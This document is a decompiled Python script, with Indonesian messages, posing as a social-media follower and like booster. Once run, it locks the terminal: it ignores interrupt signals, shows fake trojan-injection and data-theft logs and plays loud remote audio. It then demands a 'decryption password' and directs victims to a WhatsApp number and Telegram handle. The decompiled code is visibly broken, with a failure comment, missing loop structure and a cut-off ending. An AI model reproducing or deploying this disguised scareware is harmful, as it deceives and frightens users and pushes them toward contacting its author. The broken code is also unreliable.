global stop_threads
import os
import sys
import termios
import tty
import signal
import time
import threading
import random
reset = '[0m'
stop_threads = False
FULL_SKULL = '\r\n      ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n      ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n      ⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿\r\n      ⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿\r\n      ⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿\r\n      ⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿\r\n      ⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿\r\n      ⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿\r\n      ⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿\r\n      ⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿\r\n      ⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿\r\n      ⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉'
BANNER_INFO = '\r\n[1;31m=====================================================\r\n[1;37m [!] MAU PASWORD??? HUBUNGI GW HAHAH\r\n[1;37m [!] WHATSAPP : 6281927572561\r\n[1;33m [!] TELEGRAM : t.me/TocClock\r\n[1;31m=====================================================[0m'
def fake_logs():
    files = ['Database_SMS.db', 'WhatsApp_Backup.crypt14', 'DCIM_Private.zip', 'Banking_Log.txt', 'Instagram_Cookies.txt', 'TikTok_Cache.db', 'Facebook_Tokens.txt', 'Contacts_List.vcf', 'Gallery_Photos.zip', 'Call_Logs.db', 'Saved_Passwords.txt', 'CreditCard_Info.txt', 'Browser_History.db', 'App_Data_Backup.zip', 'System_Logs.log', 'Microphone_Records.amr', 'Screen_Records.mp4', 'WiFi_Passwords.txt', 'Email_Credentials.txt', 'SocialMedia_Messages.db', 'Payment_History.csv', 'TwoFactor_Codes.txt', 'Location_Tracking.db', 'Device_Info.txt', 'App_Usage_Stats.log', 'Cloud_Backup_Data.zip', 'Private_Notes.txt', 'Voice_Commands.amr', 'Bluetooth_Connections.log', 'NFC_Transactions.log', 'NFC_Transactions.log', 'System_Configurations.cfg']
    while not stop_threads:
        f = random.choice(files)
        sys.stdout.write(f'\r\n[1;30m [!!] Mencuri data penting: {f}... {random.randint(10, 99)}% [OK][0m')
        sys.stdout.flush()
        time.sleep(0.4)
def lock_system():
    # irreducible cflow, using cdg fallback
    global stop_threads
    # ***<module>.lock_system: Failure: Compilation Error
    target_pw = 'ASDF'
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTSTP, signal.SIG_IGN)
    os.system('clear')
    print('[1;32mSUNTIK ALL SOSMED BY clock21-dev')
    print('[1;37m═══════════════════════════════════════')
    print('1. TIKTOK            ║Like,Followers,Views')
    print('2. YOUTUBE           ║Like,Followers,Views')
    print('3. INSTAGRAM         ║Like,Followers,Views')
    print('4. SALURAN WA        ║Like,Followers,Views')
    print('5. TELE              ║Like,Followers,Views')
    print('6. GURB WA           ║Like,Followers,Views')
    print('7. FACEBOOK          ║Like,Followers,Views')
    print('0. KELUAR (jumlah)')
    print('[1;37m═══════════════════════════════════════[0m')
    pilih = input('[1;32mPilih nomer 1-8 : [1;37m')
    user = input('[1;32mMasukkan Username : @[1;37m')
    input('[1;32mMasukkan Jumlah : [1;37m')
    input('[1;32mMasukkan Fitur (cth:Like,Followers,View): [1;37m')
    input('[1;32mMasukkan Jumlah : [1;37m')
    print('\n[1;33m[*] Mencoba Injeksi ke Database...')
    time.sleep(2)
    print('[1;31m[!] ERROR: FIREWALL YANG LU PILIH MENDETEKSI SPAM DONGO!')
    print('[!] KEAMANAN SISTEM DIBLOKIR OLEH CLOCK21xRUCAKIN![0m')
    time.sleep(1.5)
    print('[1;33m[!] Mencoba Mengatasi Masalah...')
    time.sleep(2)
    print('[1;32m[+] Sukses Mengatasi Masalah!')
    time.sleep(1)
    print('[1;33m[!] Menghubungkan ke Server Clock21...')
    time.sleep(2)
    print('[1;32m[+] Terhubung ke Server Clock21!')
    time.sleep(1)
    print('[1;33m[!] Menyuntikkan Virus Trojan ke Sistem...')
    time.sleep(2)
    print('[1;32m[+] Virus Trojan Berhasil Disuntikkan!')
    time.sleep(1.5)
    print('[1;31m[!!!] SISTEM TERKUNCI OLEH TROJAN CLOCK21 [!!!][0m')
    time.sleep(2)
    print('[1;33m[!] Mempersiapkan Dekripsi Sistem...')
    time.sleep(2)
    print('[1;32m[+] Sistem Siap Didekripsi!')
    time.sleep(1.5)
    print('[1;33m[!] Memulai Proses Dekripsi...')
    time.sleep(2)
    print('[1;32m[+] Proses Dekripsi Selesai!')
    time.sleep(1.5)
    print('[1;31m[!!!] MASUKKAN PASSWORD DEKRIPSI UNTUK MEMULIHKAN SISTEM [!!!][0m')
    time.sleep(2)
    print('[1;33m[!] Sistem Mengaktifkan Alarm Keamanan...')
    time.sleep(2)
    print('[1;31m[!!!] PASSWORD SALAH AKAN MENYEBABKAN HILANGNYA DATA PENTING [!!!][0m')
    time.sleep(2)
    print('[1;33m[!] SILAHKAN MASUKKAN PASSWORD DEKRIPSI:[0m')
    time.sleep(2)
    tty.setraw(sys.stdin.fileno())
    os.system('clear')
    sys.stdout.write(f'[1;31m{FULL_SKULL}[0m\r\n')
    sys.stdout.write(BANNER_INFO + '\r\n')
    sys.stdout.write('\r\n[5;31m [!!!] YOUR SYSTEM IS LOCKED BY CLOCK21 TROJAN [!!!][0m')
    sys.stdout.flush()
    t = threading.Thread(target=fake_logs)
    t.daemon = True
    t.start()
    sys.stdout.write('\r\n[1;37m [?] MASUKKAN PASSWORD DEKRIPSI: [0m')
    sys.stdout.flush()
    input_buffer = ''
    os.system('mpv --loop --no-terminal --really-quiet --volume=100 https://g.top4top.io/m_368691lux1.mp3 &')
    os.system('mpv --loop --no-terminal --really-quiet --volume=50 https://g.top4top.io/m_36859qlws1.mp3 &')
        char = sys.stdin.read(1)
        if ord(char) == 13:
            if input_buffer == target_pw:
                stop_threads = True
                os.system('pkill mpv > /dev/null 2>&1')
                sys.stdout.write('\r\n[1;32m [+] PASSWORD BENAR ANJING SENENG LU YA..... [0m\r\n')
                time.sleep(1)
                sys.stdout.write('\r\n[1;31m [!] PASSWORD SALAH GOBLOK. [0m\r\n')
                sys.stdout.write('[1;37m [?]MASUKIN PASSWORD YANG BENER DI SINI ANJING: [0m')
                input_buffer = ''
            if ord(char) == 27:
                os.system('pkill mpv > /dev/null 2>&1')
                if ord(char) in [127, 8]:
                    input_buffer = input_buffer[:(-1)]
                else:
                    input_buffer += char
                    stop_threads = True
                    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
                    os.system('pkill mpv > /dev/null 2>&1')
                    os.system('clear')
                    print('╦╔═╔═╗╦  ╔═╗╦═╗')
                    print('╠╩╗║╣ ║  ╠═╣╠╦╝')
                    print('╩ ╩╚═╝╩═╝╩ ╩╩╚═')
                    print('╔╦╗╔═╗╔═╗╦ ╦╦ ╦')
                    print(' ║║║╣ ║  ╠═╣╠═╣')
                    print('═╩╝╚═╝╚═╝╩ ╩╩ ╩')
                    print('╔═╗╦ ╦╔╗╔╔╦╗╦╦╔═')
                    print('╚═╗║ ║║║║ ║ ║╠╩╗')
                    print('╝╚╝ ╩ ╩ ╩ ')
if __name__ == '__main__':
    lock_system()